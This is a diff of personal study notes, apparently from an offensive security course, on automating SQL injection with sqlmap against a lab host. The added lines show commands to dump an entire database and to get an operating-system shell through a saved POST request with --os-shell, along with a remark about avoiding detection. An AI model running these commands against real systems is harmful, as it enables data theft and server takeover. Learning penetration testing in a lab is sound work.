@@ -186,7 +186,20 @@ www-data is a common user associated with web servers on linux
 
 10.3.2. Automating the Attack
 sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
+-p: specify parameter (this is for get, how would you do this for a post? Does this question even make sense?)
+
+Due to its high volume of traffic, sqlmap should not be used as a first choice tool during assignments that require staying under the radar.
+
 sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
+--dump: Dump the entire database
+
+SQL Map get a shell:
+1) Intercept a post request via burp and save as text file on attack box
+
+Next, we can invoke sqlmap with the -r parameter, using our file containing the POST request as an argument. 
+sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+
+
 
 
 
